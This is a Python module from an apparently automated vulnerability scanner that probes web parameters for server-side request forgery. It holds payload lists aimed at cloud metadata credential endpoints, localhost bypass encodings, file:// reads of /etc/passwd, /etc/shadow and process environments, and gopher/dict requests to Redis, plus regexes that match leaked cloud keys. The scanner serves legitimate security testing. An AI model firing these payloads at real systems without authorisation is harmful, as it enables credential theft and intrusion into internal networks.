"""
XLayer AI SSRF Hunter - Detects Server-Side Request Forgery vulnerabilities

XLayer AI Compatible - SSRF Category:
- Internal Network Access (SSRF_INTERNAL)
- Cloud Metadata Exposure (SSRF_CLOUD_METADATA)
- File Read via SSRF (SSRF_FILE_READ)
- Blind SSRF Detection
"""

import re
import time
import asyncio
from typing import List, Optional, Dict, Any, Tuple
from urllib.parse import urlparse, quote, urlencode
from loguru import logger

from xlayer_hunter.core.vuln_hunters.base import BaseHunter, HunterResult
from xlayer_hunter.models.target import AttackSurface, Endpoint
from xlayer_hunter.models.vulnerability import (
    VulnHypothesis, VulnType, Confidence, VulnIndicator
)
from xlayer_hunter.tools.payload_manager import PayloadCategory


class SSRFHunter(BaseHunter):
    """
    Server-Side Request Forgery (SSRF) Hunter
    
    Comprehensive SSRF detection covering:
    - Internal network access (localhost, private IPs)
    - Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
    - File protocol abuse (file://)
    - DNS rebinding indicators
    - Blind SSRF via timing analysis
    - Protocol smuggling (gopher://, dict://)
    
    OWASP: A10:2021 - Server-Side Request Forgery
    CWE: CWE-918
    """
    
    name = "ssrf"
    vuln_types = [
        VulnType.SSRF,
        VulnType.SSRF_INTERNAL,
        VulnType.SSRF_CLOUD_METADATA,
        VulnType.SSRF_FILE_READ
    ]
    
    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "aws": {
            "urls": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/ami-id",
                "http://169.254.169.254/latest/meta-data/instance-id",
                "http://169.254.169.254/latest/meta-data/instance-type",
                "http://169.254.169.254/latest/meta-data/local-hostname",
                "http://169.254.169.254/latest/meta-data/public-hostname",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
            ],
            "indicators": [
                r"ami-[a-z0-9]+",
                r"i-[a-z0-9]+",
                r"ip-\d+-\d+-\d+-\d+",
                r"ec2\.internal",
                r"AccessKeyId",
                r"SecretAccessKey",
                r"Token",
                r"availabilityZone",
                r"instanceType",
            ]
        },
        "gcp": {
            "urls": [
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/project/project-id",
                "http://169.254.169.254/computeMetadata/v1/instance/zone",
                "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
            ],
            "headers": {"Metadata-Flavor": "Google"},
            "indicators": [
                r"projects/\d+",
                r"zones/[a-z]+-[a-z]+\d+-[a-z]",
                r"access_token",
                r"token_type",
                r"computeMetadata",
            ]
        },
        "azure": {
            "urls": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ],
            "headers": {"Metadata": "true"},
            "indicators": [
                r"subscriptionId",
                r"resourceGroupName",
                r"vmId",
                r"azEnvironment",
                r"access_token",
            ]
        },
        "digitalocean": {
            "urls": [
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.169.254/metadata/v1/id",
                "http://169.254.169.254/metadata/v1/hostname",
            ],
            "indicators": [
                r"droplet_id",
                r"hostname",
                r"region",
            ]
        }
    }
    
    # Internal network payloads with bypass techniques
    INTERNAL_PAYLOADS = {
        "localhost_basic": [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:8080",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:27017",
        ],
        "localhost_bypass": [
            "http://[::1]",
            "http://0.0.0.0",
            "http://0177.0.0.1",          # Octal
            "http://2130706433",           # Decimal
            "http://0x7f.0x0.0x0.0x1",    # Hex
            "http://127.1",
            "http://127.0.1",
            "http://127.000.000.001",
            "http://localhost.localdomain",
            "http://127.0.0.1.nip.io",
            "http://spoofed.burpcollaborator.net",  # DNS rebinding
        ],
        "private_networks": [
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://10.0.0.1:8080",
            "http://172.17.0.1",  # Docker default gateway
        ],
        "special": [
            "http://0",
            "http://0.0.0.0:80",
            "http://[0:0:0:0:0:0:0:1]",
            "http://127.127.127.127",
        ]
    }
    
    # File protocol payloads
    FILE_PAYLOADS = [
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///etc/shadow",
        "file:///etc/hostname",
        "file:///proc/self/environ",
        "file:///proc/self/cmdline",
        "file:///c:/windows/system32/drivers/etc/hosts",
        "file:///c:/windows/win.ini",
    ]
    
    # Protocol smuggling payloads
    PROTOCOL_PAYLOADS = [
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/INFO",
        "sftp://127.0.0.1:22",
        "tftp://127.0.0.1:69/test",
        "ldap://127.0.0.1:389",
    ]
    
    # Response indicators
    SSRF_INDICATORS = {
        "internal_service": [
            r"<title>.*Dashboard.*</title>",
            r"<title>.*Admin.*</title>",
            r"nginx",
            r"apache",
            r"Welcome to nginx",
            r"Apache.*Server",
            r"IIS.*Windows",
            r"Tomcat",
            r"Jenkins",
            r"Kubernetes",
            r"Docker",
            r"phpMyAdmin",
            r"Grafana",
            r"Prometheus",
        ],
        "database": [
            r"redis_version",
            r"MongoDB",
            r"mysql",
            r"PostgreSQL",
            r"memcached",
            r"elasticsearch",
        ],
        "file_content": [
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"nobody:.*:65534:",
            r"/bin/bash",
            r"/bin/sh",
            r"\[boot loader\]",
            r"\[fonts\]",
            r"# /etc/",
            r"127\.0\.0\.1\s+localhost",
        ],
        "error_disclosure": [
            r"Connection refused",
            r"Connection timed out",
            r"No route to host",
            r"Network is unreachable",
            r"Name or service not known",
        ]
    }
    
    async def hunt(self, attack_surface: AttackSurface) -> HunterResult:
        """Hunt for SSRF vulnerabilities"""
        start_time = time.time()
        self._reset_state()
        
        logger.info(f"SSRF Hunter starting - XLayer AI compatible")
        
        # Find URL-accepting parameters
        url_params = self._find_url_parameters(attack_surface)
        logger.info(f"Found {len(url_params)} potential SSRF injection points")
        
        for endpoint, param_name in url_params:
            # Test cloud metadata access
            cloud_hypotheses = await self._test_cloud_metadata(endpoint, param_name)
            self._hypotheses.extend(cloud_hypotheses)
            
            # Test internal network access
            internal_hypotheses = await self._test_internal_access(endpoint, param_name)
            self._hypotheses.extend(internal_hypotheses)
            
            # Test file protocol
            file_hypotheses = await self._test_file_protocol(endpoint, param_name)
            self._hypotheses.extend(file_hypotheses)
            
            # Test protocol smuggling
            protocol_hypotheses = await self._test_protocol_smuggling(endpoint, param_name)
            self._hypotheses.extend(protocol_hypotheses)
        
        duration = time.time() - start_time
        result = self._build_result(duration)
        
        logger.info(
            f"SSRF Hunter complete: {result.findings_count} hypotheses, "
            f"{result.high_confidence_count} high confidence"
        )
        
        return result
    
    def _find_url_parameters(self, attack_surface: AttackSurface) -> List[Tuple[Endpoint, str]]:
        """Find parameters that might accept URLs"""
        url_params = []
        
        url_param_names = [
            # Direct URL parameters
            "url", "uri", "href", "link", "src", "source",
            # Redirect parameters
            "redirect", "redirect_uri", "redirect_url", "return", "return_url",
            "next", "next_url", "goto", "target", "dest", "destination",
            "rurl", "return_to", "checkout_url", "continue",
            # Fetch/Load parameters
            "fetch", "load", "request", "proxy", "callback",
            "feed", "rss", "atom", "xml",
            # File/Path parameters
            "file", "path", "filepath", "document", "doc",
            "page", "folder", "root", "dir",
            # Image/Media parameters
            "img", "image", "pic", "picture", "icon", "logo",
            "avatar", "photo", "media", "video", "audio",
            # API parameters
            "api", "endpoint", "host", "site", "domain",
            "server", "service", "webhook", "hook",
            # Data parameters
            "data", "reference", "ref", "html", "content",
        ]
        
        for endpoint in attack_surface.testable_endpoints:
            for param in endpoint.parameters:
                param_lower = param.name.lower()
                
                # Check parameter name
                if any(u in param_lower for u in url_param_names):
                    url_params.append((endpoint, param.name))
                    continue
                
                # Check sample value for URL patterns
                if param.sample_value:
                    value = param.sample_value.lower()
                    if value.startswith(("http://", "https://", "//", "ftp://", "file://")):
                        url_params.append((endpoint, param.name))
                    elif re.match(r'^[a-z0-9.-]+\.[a-z]{2,}', value):
                        url_params.append((endpoint, param.name))
        
        return url_params
    
    async def _test_cloud_metadata(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> List[VulnHypothesis]:
        """Test for cloud metadata access (AWS, GCP, Azure, DO)"""
        hypotheses = []
        
        for cloud_provider, config in self.CLOUD_METADATA.items():
            for payload_url in config["urls"][:3]:  # Test top 3 per provider
                self._payloads_sent += 1
                
                response = await self._send_payload(endpoint, parameter, payload_url)
                
                if not response or response.get("error"):
                    continue
                
                body = response["body"]
                status = response["status"]
                
                if status != 200:
                    continue
                
                # Check for cloud-specific indicators
                for pattern in config.get("indicators", []):
                    if re.search(pattern, body, re.IGNORECASE):
                        indicators = [
                            VulnIndicator(
                                indicator_type="cloud_metadata",
                                detail=f"{cloud_provider.upper()} metadata exposed: {pattern}",
                                confidence_boost=0.3
                            ),
                            VulnIndicator(
                                indicator_type="data_leak",
                                detail=f"Sensitive cloud data accessible",
                                confidence_boost=0.2
                            )
                        ]
                        
                        hypothesis = self._create_hypothesis(
                            vuln_type=VulnType.SSRF_CLOUD_METADATA,
                            endpoint=endpoint,
                            parameter=parameter,
                            confidence=Confidence.HIGH,
                            indicators=indicators,
                            suggested_payloads=config["urls"],
                            context={
                                "ssrf_type": "cloud_metadata",
                                "cloud_provider": cloud_provider,
                                "payload": payload_url,
                                "matched_pattern": pattern,
                                "response_preview": body[:200]
                            }
                        )
                        hypotheses.append(hypothesis)
                        return hypotheses  # Critical finding, stop testing
        
        return hypotheses
    
    async def _test_internal_access(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> List[VulnHypothesis]:
        """Test for internal network access"""
        hypotheses = []
        self._endpoints_tested += 1
        
        # Combine all internal payloads
        all_payloads = []
        for category, payloads in self.INTERNAL_PAYLOADS.items():
            all_payloads.extend(payloads[:5])  # Top 5 from each category
        
        for payload in all_payloads:
            self._payloads_sent += 1
            
            response = await self._send_payload(endpoint, parameter, payload)
            
            if not response or response.get("error"):
                continue
            
            body = response["body"]
            status = response["status"]
            elapsed_ms = response.get("elapsed_ms", 0)
            
            # Analyze response for internal service indicators
            ssrf_type, indicators = self._analyze_internal_response(payload, body, status, elapsed_ms)
            
            if ssrf_type:
                hypothesis = self._create_hypothesis(
                    vuln_type=VulnType.SSRF_INTERNAL,
                    endpoint=endpoint,
                    parameter=parameter,
                    confidence=Confidence.HIGH if "service" in ssrf_type else Confidence.MEDIUM,
                    indicators=indicators,
                    suggested_payloads=[payload],
                    context={
                        "ssrf_type": ssrf_type,
                        "payload": payload,
                        "response_length": len(body),
                        "status_code": status,
                        "response_time_ms": elapsed_ms
                    }
                )
                hypotheses.append(hypothesis)
                
                if hypothesis.confidence == Confidence.HIGH:
                    break
        
        return hypotheses
    
    async def _test_file_protocol(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> List[VulnHypothesis]:
        """Test for file:// protocol SSRF"""
        hypotheses = []
        
        for payload in self.FILE_PAYLOADS:
            self._payloads_sent += 1
            
            response = await self._send_payload(endpoint, parameter, payload)
            
            if not response or response.get("error"):
                continue
            
            body = response["body"]
            status = response["status"]
            
            if status != 200:
                continue
            
            # Check for file content indicators
            for pattern in self.SSRF_INDICATORS["file_content"]:
                if re.search(pattern, body, re.IGNORECASE):
                    indicators = [
                        VulnIndicator(
                            indicator_type="file_read",
                            detail=f"Local file content exposed via file:// protocol",
                            confidence_boost=0.3
                        ),
                        VulnIndicator(
                            indicator_type="content_match",
                            detail=f"File content pattern matched: {pattern[:30]}",
                            confidence_boost=0.2
                        )
                    ]
                    
                    hypothesis = self._create_hypothesis(
                        vuln_type=VulnType.SSRF_FILE_READ,
                        endpoint=endpoint,
                        parameter=parameter,
                        confidence=Confidence.HIGH,
                        indicators=indicators,
                        suggested_payloads=self.FILE_PAYLOADS,
                        context={
                            "ssrf_type": "file_read",
                            "payload": payload,
                            "file_path": payload.replace("file://", ""),
                            "response_preview": body[:300]
                        }
                    )
                    hypotheses.append(hypothesis)
                    return hypotheses  # Critical finding
        
        return hypotheses
    
    async def _test_protocol_smuggling(
        self,
        endpoint: Endpoint,
        parameter: str
    ) -> List[VulnHypothesis]:
        """Test for protocol smuggling (gopher, dict, etc.)"""
        hypotheses = []
        
        for payload in self.PROTOCOL_PAYLOADS:
            self._payloads_sent += 1
            
            response = await self._send_payload(endpoint, parameter, payload)
            
            if not response:
                continue
            
            body = response.get("body", "")
            status = response.get("status", 0)
            
            # Check for database/service responses
            for pattern in self.SSRF_INDICATORS["database"]:
                if re.search(pattern, body, re.IGNORECASE):
                    indicators = [
                        VulnIndicator(
                            indicator_type="protocol_smuggling",
                            detail=f"Protocol smuggling successful via {payload.split(':')[0]}://",
                            confidence_boost=0.25
                        )
                    ]
                    
                    hypothesis = self._create_hypothesis(
                        vuln_type=VulnType.SSRF_INTERNAL,
                        endpoint=endpoint,
                        parameter=parameter,
                        confidence=Confidence.HIGH,
                        indicators=indicators,
                        suggested_payloads=[payload],
                        context={
                            "ssrf_type": "protocol_smuggling",
                            "protocol": payload.split(":")[0],
                            "payload": payload
                        }
                    )
                    hypotheses.append(hypothesis)
                    return hypotheses
        
        return hypotheses
    
    def _analyze_internal_response(
        self,
        payload: str,
        body: str,
        status: int,
        elapsed_ms: float
    ) -> Tuple[Optional[str], List[VulnIndicator]]:
        """Analyze response for internal access indicators"""
        indicators = []
        
        # Check for internal service indicators
        for pattern in self.SSRF_INDICATORS["internal_service"]:
            if re.search(pattern, body, re.IGNORECASE):
                indicators.append(VulnIndicator(
                    indicator_type="internal_service",
                    detail=f"Internal service detected: {pattern}",
                    confidence_boost=0.2
                ))
                return "internal_service", indicators
        
        # Check for database responses
        for pattern in self.SSRF_INDICATORS["database"]:
            if re.search(pattern, body, re.IGNORECASE):
                indicators.append(VulnIndicator(
                    indicator_type="database_access",
                    detail=f"Database service accessible: {pattern}",
                    confidence_boost=0.25
                ))
                return "database_access", indicators
        
        # Check for error-based detection
        for pattern in self.SSRF_INDICATORS["error_disclosure"]:
            if re.search(pattern, body, re.IGNORECASE):
                indicators.append(VulnIndicator(
                    indicator_type="error_disclosure",
                    detail=f"Network error disclosed: {pattern}",
                    confidence_boost=0.1
                ))
                return "error_disclosure", indicators
        
        # Check for successful response from internal IP
        if status == 200 and len(body) > 50:
            if "127.0.0.1" in payload or "localhost" in payload or "::1" in payload:
                if not body.startswith("<!DOCTYPE") or "<html" in body.lower():
                    indicators.append(VulnIndicator(
                        indicator_type="localhost_response",
                        detail="Got valid response from localhost",
                        confidence_boost=0.15
                    ))
                    return "localhost_access", indicators
        
        return None, []
    
    def _analyze_response(
        self,
        endpoint: Endpoint,
        parameter: str,
        payload: str,
        response: Dict[str, Any]
    ) -> Optional[VulnHypothesis]:
        """Analyze response for SSRF indicators (base class implementation)"""
        return None
